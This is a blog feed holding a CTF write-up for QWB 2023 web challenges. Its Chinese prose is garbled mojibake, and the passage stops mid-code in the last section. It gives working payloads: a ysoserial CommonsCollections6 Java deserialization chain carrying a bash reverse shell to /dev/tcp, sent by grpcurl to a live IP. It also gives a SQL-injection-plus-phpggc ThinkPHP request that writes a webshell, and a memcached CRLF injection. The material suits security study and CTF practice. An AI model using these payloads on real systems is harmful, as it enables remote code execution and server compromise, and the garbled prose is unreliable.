<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2023-12-20T11:06:09+08:00</updated><id>/feed.xml</id><title type="html">DumKiyâ€™s blog</title><subtitle>Watch And Learn
</subtitle><author><name>DumKiy</name></author><entry><title type="html">QWB 2023 Writeup</title><link href="/ctf/2023/12/19/QWB-2023-writeup.html" rel="alternate" type="text/html" title="QWB 2023 Writeup" /><published>2023-12-19T18:29:48+08:00</published><updated>2023-12-19T18:29:48+08:00</updated><id>/ctf/2023/12/19/QWB-2023-writeup</id><content type="html" xml:base="/ctf/2023/12/19/QWB-2023-writeup.html"><![CDATA[<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231219213702.png" alt="20231219213702" /></p>

<h1 id="web">WEB</h1>
<h2 id="happygame">happygame</h2>
<p>é¢˜ç›®æä¾›äº†ä¸€ä¸ª gRPC æœåŠ¡ã€‚gRPC æ˜¯ä¸€ä¸ªç”± Google åˆå§‹å¼€å‘çš„é«˜æ€§èƒ½ã€å¼€æºçš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰æ¡†æ¶ã€‚ç½‘ä¸Šå·²æœ‰ä¸å°‘é’ˆå¯¹ gRPC çš„å®‰å…¨ç ”ç©¶ï¼š</p>
<ul>
  <li><a href="https://paper.seebug.org/1616/#01">ã€Black Hat Asia 2021ç³»åˆ—åˆ†äº«ã€‘è‡ªåŠ¨åŒ–æŒ–æ˜ gRPC ç½‘ç»œæ¥å£æ¼æ´</a></li>
  <li><a href="https://xz.aliyun.com/t/11985#toc-2">gRPCå†…å­˜é©¬ç ”ç©¶ä¸æŸ¥æ€ - å…ˆçŸ¥ç¤¾åŒº</a></li>
</ul>

<p>gRPC æ¡†æ¶å¦‚ä¸‹æ‰€ç¤ºï¼š
<img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231218193159.png" alt="20231218193159" /></p>

<p>å¯è§æœåŠ¡ç«¯ç”± Java ç¼–å†™ã€‚</p>

<p>é’ˆå¯¹ gRPC æœåŠ¡ç«¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ gRPCurl æ¥é€æ­¥æšä¸¾æœåŠ¡ç«¯æä¾›çš„æ¥å£ä»¥åŠæ¥å£å®šä¹‰ã€‚ä¸‹è½½é“¾æ¥ï¼š<a href="https://github.com/fullstorydev/grpcurl">fullstorydev/grpcurl: Like cURL, but for gRPC: Command-line tool for interacting with gRPC servers</a></p>

<p>æ ¹æ®å·¥å…·æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ list æ¥æšä¸¾æ¥å£ï¼Œä¾‹å¦‚ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grpcurl <span class="nt">-vv</span> 8.147.133.154:43668 list
grpcurl <span class="nt">-vv</span> 8.147.133.154:43668 list helloworld.Greeter
</code></pre></div></div>
<p>ä½¿ç”¨ describe æ¥è·å–æ¥å£å®šä¹‰åŠå‚æ•°ä¿¡æ¯:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grpcurl <span class="nt">-vv</span> 8.147.133.154:43668 describe helloworld.Greeter.ProcessMsg
</code></pre></div></div>
<p>helloworld.Greeter.ProcessMsg æ¥å£å¯ä»¥æ¥æ”¶ä¸€ä¸ª serializeDataï¼Œå‘åŒ…æ ¼å¼å¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./grpcurl <span class="nt">-plaintext</span> <span class="nt">-d</span> <span class="s1">'{"serializeData":"xxxxx'</span> <span class="nt">-vv</span> 8.147.133.154:43668 helloworld.Greeter/ProcessMsg
</code></pre></div></div>
<p>å¯ä»¥çŒœæµ‹æ­¤å¤„å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¹¶ä¸”å‘é€æ•°æ®ä¹‹åï¼Œæ¥å£çš„æŠ¥é”™ä¿¡æ¯ä¼šæç¤ºæˆ‘ä»¬éœ€è¦å‘é€ base64 ç¼–ç æ•°æ®ã€‚</p>

<p>æµ‹è¯• URLDNS åˆ©ç”¨é“¾æ—¶ç¡®è®¤å­˜åœ¨æ¼æ´ï¼Œç„¶ååˆ©ç”¨ CC6 å¯ä»¥ getshellã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># bash -i &gt;&amp; /dev/tcp/xxxx/9999 0&gt;&amp;1</span>
<span class="c"># bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHh4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}</span>

ysoserial CommonsCollections6 <span class="s1">'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHh4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}'</span>  | <span class="nb">base64</span> <span class="nt">-w</span> 0
</code></pre></div></div>

<p>poc:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./grpcurl <span class="nt">-plaintext</span> <span class="nt">-d</span> <span class="s1">'{"serializeData":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AGFiYXNoIC1jIHtlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNRFF1TWpJMUxqSXpPQzR4TVRBdk9UazVPU0F3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9dAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="}'</span> <span class="nt">-vv</span> 8.147.133.154:43668 helloworld.Greeter/ProcessMsg
</code></pre></div></div>

<h2 id="thinkshop">thinkshop</h2>
<p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªåŸºäº thinkphp çš„ php æœåŠ¡ï¼Œæ¨¡æ¿ goods_edit.html ä¸­å­˜åœ¨ unserialize æ“ä½œï¼Œthinkphp ç‰ˆæœ¬ä¸º 5.0.23ï¼Œå¯ä»¥è€ƒè™‘åˆ©ç”¨ååºåˆ—åŒ–å†™å…¥ webshellã€‚</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;textarea</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"data"</span> <span class="na">name=</span><span class="s">"data"</span> <span class="na">rows=</span><span class="s">"3"</span> <span class="na">required</span><span class="nt">&gt;</span>{php}
        
        use app\index\model\Goods;$view=new Goods();echo $view-&gt;arrayToMarkdown(unserialize(base64_decode($goods['data'])));{/php}<span class="nt">&lt;/textarea&gt;</span>
</code></pre></div></div>
<p>ç¼–è¾‘å•†å“é¡µé¢éœ€è¦ç™»é™† admin æ‰èƒ½è®¿é—®ï¼Œæ•°æ®åº“ä¸­ä¿å­˜çš„ hash æ˜¯ 123456 çš„ md5ï¼Œä½†ç™»å½•éƒ¨åˆ†çš„ä»£ç æ•…æ„å†™é”™ï¼Œè¾“å…¥ 1/123456 æ‰èƒ½æ­£å¸¸ç™»å½•ã€‚</p>

<p>é€šè¿‡ goods_edit.html æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ•°æ®åº“ä¸­çš„ goods è¡¨çš„ data å­—æ®µã€‚ä½† saveGoods å‡½æ•°ä¼šå…ˆå°†æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åå†ä¿å­˜ï¼Œæœ€ç»ˆå†™å…¥çš„ payload éƒ½ä¼šå˜æˆå­—ç¬¦ä¸²ï¼Œæ— æ³•æ­£å¸¸è§¦å‘ thinkphp åˆ©ç”¨é“¾ã€‚</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">saveGoods</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$data</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">markdownToArray</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'data'</span><span class="p">])));</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>ä½† updatedata å‡½æ•°å­˜åœ¨ sql æ³¨å…¥ï¼Œå¯ä»¥åˆ©ç”¨ SQL æ³¨å…¥å°† payload æ’å…¥åˆ° data å­—æ®µã€‚</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">updatedata</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$table</span><span class="p">,</span> <span class="nv">$id</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'Error'</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"UPDATE </span><span class="nv">$table</span><span class="s2"> SET "</span><span class="p">;</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$sql</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"`</span><span class="nv">$key</span><span class="s2">` = unhex('"</span> <span class="mf">.</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"'), "</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nv">$sql</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="s1">', '</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">" WHERE `id` = "</span> <span class="mf">.</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
            <span class="k">return</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(),</span> <span class="nv">$sql</span><span class="p">);</span>


        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>æ­¤å¤–ï¼Œé¢˜ç›®åœ¨ååºåˆ—åŒ–å‰è¿˜æœ‰ä¸€ä¸ªæ ¡éªŒæ“ä½œï¼šä»æ•°æ®åº“å–å‡º data æ—¶ä¼šåˆ¤æ–­æ˜¯å¦ä»¥ YTo å¼€å¤´ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">getGoodsById</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$select</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Select</span><span class="p">();</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$select</span><span class="o">-&gt;</span><span class="nf">select</span><span class="p">(</span><span class="s1">'goods'</span><span class="p">,</span> <span class="s1">'id'</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'data'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'data'</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!==</span> <span class="s2">"YTo"</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">error</span><span class="p">(</span><span class="s2">"æ•°æ®é”™è¯¯"</span> <span class="p">,</span> <span class="s1">'index/admin/goods_edit'</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>å…¶å®æ˜¯è¦æ±‚ååºåˆ—åŒ–å‡ºæ¥ä¸€ä¸ªæ•°ç»„ï¼Œå¯ä»¥ä¿®æ”¹ä¸€ä¸‹ phpggcï¼ŒåŒ…ä¸€å±‚æ•°ç»„åå†ç”Ÿæˆ payloadï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phpggc ThinkPHP/FW1 /var/www/html/ /mnt/share/project/CTF/QWB/thinkshop/shell.php <span class="nt">-b</span> <span class="nt">-u</span>
</code></pre></div></div>
<p>å‘é€ payloadï¼š</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/public/index.php/index/admin/do_edit.html</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1629</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com/public/index.php/index/admin/goods_edit/id/1.html</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=9kfk3dm38nq1p2tbm00p6toad7</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

id=1&amp;name`%3d"",`data`%3d"YToyOntpOjA7aToxO2k6MTtPOjEzOiJ0aGlua1xQcm9jZXNzIjozOntzOjI3OiIAdGhpbmtcUHJvY2VzcwBwcm9jZXNzUGlwZXMiO086Mjg6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEhhc01hbnkiOjU6e3M6ODoiACoAcXVlcnkiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo1OiJ3aGVyZSI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086Mjk6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI4OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGVkIjozOntzOjY6IgAqAHRhZyI7YjoxO3M6MTA6IgAqAG9wdGlvbnMiO2E6Mjp7czo2OiJleHBpcmUiO2k6MDtzOjY6InByZWZpeCI7czowOiIiO31zOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czo2OiIAKgB0YWciO2I6MDtzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjM2MDA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7czo0OiJwYXRoIjtzOjU4OiJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvIjt9fX19fXM6OToiACoAcGFyZW50IjtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6MTp7czoxOiJhIjtzOjE6IjEiO31zOjExOiIAKgBsb2NhbEtleSI7czoxOiJhIjtzOjg6IgAqAHBpdm90IjtOO3M6MTM6IgAqAGZvcmVpZ25LZXkiO3M6MzU6IkFBQVBEOXdhSEFnWlhaaGJDZ2tYMGRGVkZ0aFhTazdQejRLIjt9czoyMToiAHRoaW5rXFByb2Nlc3MAc3RhdHVzIjtpOjM7czozMzoiAHRoaW5rXFByb2Nlc3MAcHJvY2Vzc0luZm9ybWF0aW9uIjthOjE6e3M6NzoicnVubmluZyI7YjoxO319fQ%3D%3D"where`id`%3d1%23=1111&amp;price=&amp;on_sale_time=&amp;image=11111&amp;data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A
</code></pre></div></div>
<p>ç„¶åè®¿é—®ç¼–è¾‘é¡µé¢å³å¯è§¦å‘å†™å…¥ webshellã€‚</p>

<h2 id="thinkshopping">thinkshopping</h2>
<p>æ¯”èµ›æ—¶æ²¡æœ‰å†™å‡ºï¼Œå‚è€ƒå…¶ä»– writeup è¿›è¡Œå¤ç›˜ï¼š</p>
<ul>
  <li><a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1702950024&amp;ver=4965&amp;signature=rXSWR*9miRpbF-9myXm8A6FnpOaDzclgYRus5rrfhSVt3OOHMhH76*ppZ8Ix9s*MdhFfxNDEi8x4PAnfqQ8HHP09V*7Y8HtgZCmq7RSw8ofAA5oGcILr2wQSXwUlNL10&amp;new=1">[CTFå¤ç°è®¡åˆ’]2023å¼ºç½‘æ¯åˆèµ› thinkshop[ping]</a></li>
  <li><a href="https://boogipop.com/2023/12/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Web%20Writeup/#easyphp">ç¬¬ä¸ƒå±Š å¼ºç½‘æ¯ å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ› Web Writeup - Boogiepop Doesnâ€™t Laugh</a></li>
</ul>

<p>thinkshopping çš„ç¯å¢ƒä¸ thinkshop æœ‰æ‰€ä¸åŒï¼š</p>
<ol>
  <li>ç§»é™¤äº† good_edit.html ä¸­ååºåˆ—åŒ–çš„æ“ä½œã€‚</li>
  <li>ç§»é™¤äº†æ•°æ®åº“ä¸­çš„ admin ç”¨æˆ·ï¼Œè¿™å¯¼è‡´æ­£å¸¸æƒ…å†µä¸‹æ— æ³•ç™»é™†ã€‚</li>
  <li>æ•°æ®åº“ä¸­å°† secure-file-priv ç½®ç©ºï¼ˆthinkshop ä¸­ä¸ºé web ç›®å½•ï¼‰ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ load_file è¯»å– flag æ–‡ä»¶ï¼Œsql æ³¨å…¥æ¼æ´ä¾ç„¶å­˜åœ¨ï¼Œæ‰€ä»¥åªéœ€è¦ç™»é™†åå°å³å¯è¯»å– flagã€‚</li>
</ol>

<p>æ³¨æ„åˆ°ç™»é™†å¤„é…ç½®äº† cacheï¼Œç™»é™†æ—¶ä¼šå°è¯•ä»ç¼“å­˜ä¸­è·å–æ•°æ®ã€‚</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// å°è¯•ä»ç¼“å­˜ä¸­è·å–æ•°æ®</span>
    <span class="nv">$adminData</span> <span class="o">=</span> <span class="nc">Db</span><span class="o">::</span><span class="nf">table</span><span class="p">(</span><span class="s1">'admin'</span><span class="p">)</span>
        <span class="o">-&gt;</span><span class="nf">cache</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nv">$Expire</span><span class="p">)</span>
        <span class="o">-&gt;</span><span class="nf">find</span><span class="p">(</span><span class="nv">$username</span><span class="p">);</span>
</code></pre></div></div>
<p>å¹¶ä¸” thinkphp é‡Œé…ç½®äº† cache æ–¹å¼ä¸º Memcachedï¼ŒæŸ¥çœ‹ phpinfo å¯ä»¥åˆ¤æ–­ memcached ç‰ˆæœ¬ä¸º 2.2.0.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="s1">'cache'</span> <span class="o">=&gt;</span> <span class="p">[</span>
        <span class="c1">// é©±åŠ¨æ–¹å¼</span>
        <span class="s1">'type'</span>   <span class="o">=&gt;</span> <span class="s1">'Memcached'</span><span class="p">,</span>
        <span class="c1">// ç¼“å­˜ä¿å­˜ç›®å½•</span>
        <span class="s1">'path'</span>   <span class="o">=&gt;</span> <span class="no">CACHE_PATH</span><span class="p">,</span>
        <span class="c1">// ç¼“å­˜å‰ç¼€</span>
        <span class="s1">'prefix'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="c1">// ç¼“å­˜æœ‰æ•ˆæœŸ 0è¡¨ç¤ºæ°¸ä¹…ç¼“å­˜</span>
        <span class="s1">'expire'</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
    <span class="p">],</span>
</code></pre></div></div>
<p>å‚è€ƒ:<a href="https://www.freebuf.com/vuls/328384.html">php-memcached CRLFç»•è¿‡ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a> memcached 2.2.0 ä»¥ä¸‹å­˜åœ¨ CRLF æ¼æ´ã€‚</p>

<p>poc å¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1/test.php?token<span class="o">=</span>TOKEN%00%0D%0Aset%20snowwolf%200%20500%204%0D%0Awolf

<span class="c"># ç­‰ä»·äº</span>
<span class="nb">set </span>snowwolf 0 500 4
wolf
</code></pre></div></div>
<p>memcached çš„ set è¯­æ³•å¦‚ä¸‹:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>key flags exptime bytes <span class="o">[</span>noreply] 
value 
</code></pre></div></div>
<ol>
  <li>keyï¼šç”¨äºä»Memcachedä¸­å­˜å‚¨å’Œæ£€ç´¢æ•°æ®çš„é”®ã€‚</li>
  <li>flagsï¼šæœåŠ¡å™¨ä¸ç”¨æˆ·æä¾›çš„æ•°æ®ä¸€èµ·å­˜å‚¨çš„ 32 ä½æ— ç¬¦å·æ•´æ•°ï¼Œå¹¶åœ¨æ£€ç´¢é¡¹ç›®æ—¶ä¸æ•°æ®ä¸€èµ·è¿”å›ã€‚</li>
  <li>exptimeï¼šä»¥ç§’ä¸ºå•ä½çš„è¿‡æœŸæ—¶é—´ã€‚0è¡¨ç¤ºæ²¡æœ‰å»¶è¿Ÿã€‚å¦‚æœ exptime å¤§äº30å¤©ï¼ŒMemcachedå°†å…¶ç”¨ä½œUNIXæ—¶é—´æˆ³ä»¥è¿›è¡Œè¿‡æœŸã€‚</li>
  <li>bytesï¼šéœ€è¦å­˜å‚¨çš„æ•°æ®å—ä¸­çš„å­—èŠ‚æ•°ã€‚è¿™æ˜¯å­˜å‚¨åœ¨ Memcached ä¸­çš„æ•°æ®çš„é•¿åº¦ã€‚</li>
  <li>noreplyï¼šè¿™æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ã€‚å®ƒç”¨äºé€šçŸ¥æœåŠ¡å™¨ä¸å‘é€ä»»ä½•å›å¤ã€‚</li>
  <li>valueï¼šéœ€è¦å­˜å‚¨çš„æ•°æ®ã€‚åœ¨æ‰§è¡Œå¸¦æœ‰ä¸Šè¿°é€‰é¡¹çš„å‘½ä»¤åï¼Œéœ€è¦åœ¨æ–°è¡Œä¸Šä¼ é€’æ•°æ®ã€‚</li>
</ol>

<p>thinkphp ä¸­çš„ find å‡½æ•°å¯ä»¥åœ¨ thinkphp/library/think/db/Query.php ä¸­æ‰¾åˆ°ï¼Œå¦‚æœå¼€å¯äº† cacheã€‚æŸ¥è¯¢æ•°æ®æ—¶ä¼šè·å– <code class="language-plaintext highlighter-rouge">think:shop.admin|username</code> çš„å€¼ã€‚</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'fetch_sql'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'cache'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="c1">// åˆ¤æ–­æŸ¥è¯¢ç¼“å­˜</span>
            <span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">'cache'</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="kc">true</span> <span class="o">===</span> <span class="nv">$cache</span><span class="p">[</span><span class="s1">'key'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
